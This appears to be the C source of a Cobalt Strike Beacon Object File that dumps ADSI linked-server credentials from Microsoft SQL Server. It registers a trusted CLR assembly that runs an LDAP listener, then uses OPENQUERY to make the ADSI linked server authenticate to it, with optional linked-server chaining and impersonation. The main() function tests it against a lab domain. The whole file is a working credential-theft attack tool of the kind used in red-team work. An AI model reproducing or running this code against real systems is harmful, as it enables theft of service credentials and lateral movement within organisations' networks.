#include <pthread.h>
#include "bofdefs.h"
#include "ldapserver.h"
#include "base.c"
#include "sql.c"
#include "sql_modules.c"
#include "sql_clr.c"

typedef struct ThreadData {
    SQLHSTMT 	stmt;
    char* 		function;
    char* 		port;
	char* 		link;
	char* 		impersonate;
} ThreadData;


void* RunThreadedQuery(LPVOID threadData) {
	ThreadData* data = (ThreadData*)threadData;

    char* prefix = "SELECT dbo.";
	char* middle = "(";
	char* suffix = ");";

	size_t totalSize = MSVCRT$strlen(prefix) + MSVCRT$strlen(data->function) + MSVCRT$strlen(middle) + MSVCRT$strlen(data->port) + MSVCRT$strlen(suffix) + 1;
	char* query = (char*)intAlloc(totalSize);

	MSVCRT$strcpy(query, prefix);
	MSVCRT$strncat(query, data->function,	totalSize - MSVCRT$strlen(query) - 1);
	MSVCRT$strncat(query, middle, 			totalSize - MSVCRT$strlen(query) - 1);
	MSVCRT$strncat(query, data->port, 		totalSize - MSVCRT$strlen(query) - 1);
	MSVCRT$strncat(query, suffix, 			totalSize - MSVCRT$strlen(query) - 1);

    HandleQuery(data->stmt, (SQLCHAR*)query, data->link, data->impersonate, FALSE);

	intFree(query);
}

void DumpAdsiCreds(char* server, char* database, char* link, char* impersonate, char* adsiServer, char* port)
{
    SQLHENV env			= NULL;
    SQLHSTMT stmt 		= NULL;
	SQLHDBC dbc 		= NULL;
	SQLRETURN ret;

	//
	// non-standard, for the duplicate connection
	//
	SQLHENV env2		= NULL;
    SQLHSTMT stmt2 		= NULL;
	SQLHDBC dbc2 		= NULL;
	char* trigger 		= NULL;

	InitRandomSeed();
	char* dllPath 		= GenerateRandomString(8);
	char* function 		= GenerateRandomString(8);
	char* assemblyName 	= "ldapServer";

    if (link == NULL)
	{
		dbc = ConnectToSqlServer(&env, server, database);
	}
	else
	{
		dbc = ConnectToSqlServer(&env, server, NULL);
	}

    if (dbc == NULL) {
		goto END;
	}

	if (link == NULL)
	{
		internal_printf("[*] Obtaining ADSI credentials for \"%s\" on %s\n\n", adsiServer, server);
	}
	else
	{
		internal_printf("[*] Obtaining ADSI credentials for \"%s\" on %s via %s\n\n", adsiServer, link, server);
	}
	//
	// allocate statement handle
	//
	ret = ODBC32$SQLAllocHandle(SQL_HANDLE_STMT, dbc, &stmt);
	if (!SQL_SUCCEEDED(ret)) {
		internal_printf("[!] Failed to allocate statement handle\n");
		goto END;
	}

	//
	// verify that xp_cmdshell is enabled
	//
	if (IsModuleEnabled(stmt, "clr enabled", link, impersonate))
	{
		internal_printf("[*] CLR is enabled\n");
	}
	else
	{
		internal_printf("[!] CLR is not enabled\n");
		goto END;
	}

	//
	// close the cursor
	//
	ret = ODBC32$SQLCloseCursor(stmt);
	if (!SQL_SUCCEEDED(ret)) {
		internal_printf("[!] Failed to close cursor\n");
		goto END;
	}

	//
	// if using linked server, ensure rpc is enabled
	//
	if (link != NULL)
	{
		if (IsRpcEnabled(stmt, link))
		{
			internal_printf("[*] RPC out is enabled\n");
		}
		else
		{
			internal_printf("[!] RPC out is not enabled\n");
			goto END;
		}
		
		//
		// close the cursor
		//
		ret = ODBC32$SQLCloseCursor(stmt);
		if (!SQL_SUCCEEDED(ret)) {
			internal_printf("[!] Failed to close cursor\n");
			goto END;
		}
	}

	//
	// Check if the assembly hash already exists in sys.trusted_assemblies
	// and drop it if it does
	//
	if (AssemblyHashExists(stmt, LDAP_DLL_HASH, link, impersonate))
	{
		internal_printf("[!] Assembly hash already exists in sys.trusted_assesmblies\n");
		internal_printf("[*] Dropping existing assembly hash before continuing\n");

		//
		// Close the cursor
		//
		ret = ODBC32$SQLCloseCursor(stmt);
		if (!SQL_SUCCEEDED(ret)) {
			internal_printf("[!] Failed to close cursor\n");
			goto END;
		}
		
		if (!DeleteTrustedAssembly(stmt, LDAP_DLL_HASH, link, impersonate))
		{
			internal_printf("[!] Failed to drop existing assembly hash\n");
			goto END;
		}
	}
	else
	{
		//
		// Close the cursor
		//
		ret = ODBC32$SQLCloseCursor(stmt);
		if (!SQL_SUCCEEDED(ret)) {
			internal_printf("[!] Failed to close cursor\n");
			goto END;
		}
	}

	//
	// Add the DLL to sys.trusted_assemblies
	//
	if (!AddTrustedAssembly(stmt, dllPath, LDAP_DLL_HASH, link, impersonate))
	{
		internal_printf("[!] Failed to add trusted assembly\n");
		goto END;
	}

	internal_printf("[*] Added SHA-512 hash for DLL to sys.trusted_assemblies with the name \"%s\"\n", dllPath);

	//
	// Ensure procedure and assembly names do not already exist
	//
	if (!DeleteTrustedAssemblyResources(stmt, assemblyName, function, TRUE, link, impersonate))
	{
		internal_printf("[!] Failed to drop existing assembly and procedure\n");
		goto END;
	}

	//
	// Create the custom assembly
	//
	internal_printf("[*] Creating new LDAP server assembly with the name \"%s\"\n", assemblyName);
	CreateAssembly(stmt, assemblyName, LDAP_DLL_BYTES, link, impersonate);
	
	//
	// Verify that the assembly exists before we continue
	//
	if (!AssemblyExists(stmt, assemblyName, link, impersonate))
	{
		internal_printf("[!] Failed to create custom assembly\n");
		internal_printf("[*] Cleaning up...\n");
		DeleteTrustedAssembly(stmt, LDAP_DLL_HASH, link, impersonate);
		DeleteTrustedAssemblyResources(stmt, assemblyName, function, TRUE, link, impersonate);
		goto END;
	}

	//
	// Create the stored procedure
	//
	internal_printf("[*] Loading LDAP server assembly into a new CLR runtime routine \"%s\"\n", function);
	CreateAssemblyStoredProc(stmt, assemblyName, function, TRUE, link, impersonate);

	//
	// Clear the cursor
	//
	ClearCursor(stmt);

	//
	// Verify that the stored procedure exists before we continue
	//
	if (!AssemblyFunctionExists(stmt, "ldapAssembly.LdapSrv", link, impersonate))
	{
		internal_printf("[!] Unable to load LDAP server assembly into custom CLR runtime routine\n");
		internal_printf("[*] Cleaning up...\n");
		DeleteTrustedAssembly(stmt, LDAP_DLL_HASH, link, impersonate);
		DeleteTrustedAssemblyResources(stmt, assemblyName, function, TRUE, link, impersonate);
		goto END;
	}

	internal_printf("[*] Created \"[%s].[ldapAssembly.LdapSrv].[%s]\"\n", assemblyName, function);

	//
	// Clear the cursor
	//
	ClearCursor(stmt);

	//
	// Now things get interesting, need to create a second connection
	// and execute a blocking query in a new thread
	// while we trigger auth in the main thread
	//
	internal_printf("[*] Creating a second connection to the SQL server for threaded query\n");
	if (link == NULL)
	{
		dbc2 = ConnectToSqlServer(&env2, server, database);
	}
	else
	{
		dbc2 = ConnectToSqlServer(&env2, server, NULL);
	}

    if (dbc2 == NULL) {
		internal_printf("[!] Failed to create second connection\n");
		internal_printf("[*] Cleaning up...\n");
		DeleteTrustedAssembly(stmt, LDAP_DLL_HASH, link, impersonate);
		DeleteTrustedAssemblyResources(stmt, assemblyName, function, TRUE, link, impersonate);
		goto END;
	}

	//
	// Allocate a second statement handle
	//
	ret = ODBC32$SQLAllocHandle(SQL_HANDLE_STMT, dbc2, &stmt2);
	if (!SQL_SUCCEEDED(ret)) {
		internal_printf("[!] Failed to allocate second statement handle\n");
		goto END;
	}

	//
	// Start the blocking LDAP server query in a new thread
	//
	internal_printf("[*] Starting a local LDAP server on port %s\n", port);
	ThreadData data = {
		stmt2,
		function,
		port,
		link,
		impersonate
	};
	
	HANDLE hThread = KERNEL32$CreateThread(NULL, 0, (void*)RunThreadedQuery, &data, 0, NULL);
	if (hThread == NULL)
	{
		internal_printf("[!] Failed to create new thread\n");
		internal_printf("[*] Cleaning up...\n");
		DeleteTrustedAssembly(stmt, LDAP_DLL_HASH, link, impersonate);
		DeleteTrustedAssemblyResources(stmt, assemblyName, function, TRUE, link, impersonate);
		goto END;
	}

	//
	// Trigger auth
	//
	internal_printf("[*] Executing LDAP solication (this will fire some errors)...\n\n");

	if (link == NULL)
	{
		char* part1 = "SELECT * FROM OPENQUERY(\"";
		char* part2 = "\", 'SELECT * FROM ''LDAP://localhost:";
		char* part3 = "''')";

		size_t totalSize = MSVCRT$strlen(part1) + MSVCRT$strlen(adsiServer) + MSVCRT$strlen(part2) + MSVCRT$strlen(port) + MSVCRT$strlen(part3) + 1;
		trigger = (char*)intAlloc(totalSize);

		MSVCRT$strcpy(trigger, part1);
		MSVCRT$strncat(trigger, adsiServer, totalSize - MSVCRT$strlen(trigger) - 1);
		MSVCRT$strncat(trigger, part2, 		totalSize - MSVCRT$strlen(trigger) - 1);
		MSVCRT$strncat(trigger, port, 		totalSize - MSVCRT$strlen(trigger) - 1);
		MSVCRT$strncat(trigger, part3, 		totalSize - MSVCRT$strlen(trigger) - 1);
	}
	else
	{
		//
		// disgusting.
		//
		char* part1 = "SELECT * FROM OPENQUERY(\"";
		char* part2 = "\", 'SELECT * FROM OPENQUERY(\"";
		char* part3 = "\", ''SELECT * FROM ''''LDAP://localhost:"; 
		char* part4 = "'''''')')";

		size_t totalSize = MSVCRT$strlen(part1) + MSVCRT$strlen(link) + MSVCRT$strlen(part2) + MSVCRT$strlen(adsiServer) + MSVCRT$strlen(part3) + MSVCRT$strlen(port) + MSVCRT$strlen(part4) + 1;
		trigger = (char*)intAlloc(totalSize);

		MSVCRT$strcpy(trigger, part1);
		MSVCRT$strncat(trigger, link, 		totalSize - MSVCRT$strlen(trigger) - 1);
		MSVCRT$strncat(trigger, part2, 		totalSize - MSVCRT$strlen(trigger) - 1);
		MSVCRT$strncat(trigger, adsiServer, totalSize - MSVCRT$strlen(trigger) - 1);
		MSVCRT$strncat(trigger, part3, 		totalSize - MSVCRT$strlen(trigger) - 1);
		MSVCRT$strncat(trigger, port, 		totalSize - MSVCRT$strlen(trigger) - 1);
		MSVCRT$strncat(trigger, part4, 		totalSize - MSVCRT$strlen(trigger) - 1);
	}

	HandleQuery(stmt, (SQLCHAR*)trigger, NULL, impersonate, FALSE);
	HandleQuery(stmt, (SQLCHAR*)trigger, NULL, impersonate, FALSE);

	//
	// Wait for the thread to finish
	//
	KERNEL32$WaitForSingleObject(hThread, INFINITE);
	KERNEL32$CloseHandle(hThread);

	internal_printf("\n[*] LDAP server thread finished\n\n");
	PrintQueryResults(stmt2, TRUE);

	//
	// Cleanup before we exit
	//
	internal_printf("\n[*] Cleaning up...\n");
	DeleteTrustedAssembly(stmt, LDAP_DLL_HASH, link, impersonate);
	DeleteTrustedAssemblyResources(stmt, assemblyName, function, TRUE, link, impersonate);


END:
	intFree(dllPath);
	intFree(function);
	if (trigger != NULL) intFree(trigger);
	ODBC32$SQLCloseCursor(stmt);
	DisconnectSqlServer(env, dbc, stmt);
	if (stmt2 != NULL) ODBC32$SQLCloseCursor(stmt2);
	if (dbc2 != NULL) DisconnectSqlServer(env2, dbc2, stmt2);
}


#ifdef BOF
VOID go( 
	IN PCHAR Buffer, 
	IN ULONG Length 
) 
{
	char* server;
	char* database;
	char* link;
	char* impersonate;
	char* adsiServer;
	char* port;
	
	//
	// parse beacon args 
	//
	datap parser;
	BeaconDataParse(&parser, Buffer, Length);
	server	 	= BeaconDataExtract(&parser, NULL);
	database 	= BeaconDataExtract(&parser, NULL);
	link 		= BeaconDataExtract(&parser, NULL);
	impersonate = BeaconDataExtract(&parser, NULL);
	adsiServer 	= BeaconDataExtract(&parser, NULL);
	port		= BeaconDataExtract(&parser, NULL);

	server = *server == 0 ? "localhost" : server;
	database = *database == 0 ? "master" : database;
	link = *link  == 0 ? NULL : link;
	impersonate = *impersonate == 0 ?  NULL : impersonate;

	if(!bofstart())
	{
		return;
	}

	if (UsingLinkAndImpersonate(link, impersonate))
	{
		return;
	}

	DumpAdsiCreds(server, database, link, impersonate, adsiServer, port);
	printoutput(TRUE);
};

#else

int main()
{
	internal_printf("============ BASE TEST ============\n\n");
	DumpAdsiCreds("castelblack.north.sevenkingdoms.local", "master", NULL, NULL, "ADSIr", "4444");

	internal_printf("\n\n============ IMPERSONATE TEST ============\n\n");
	DumpAdsiCreds("castelblack.north.sevenkingdoms.local", "master", NULL, "sa", "ADSIr", "4444");

	internal_printf("\n\n============ LINK TEST ============\n\n");
	DumpAdsiCreds("castelblack.north.sevenkingdoms.local", "master", "BRAAVOS", NULL, "ADSIEssos", "4444");
}

#endif
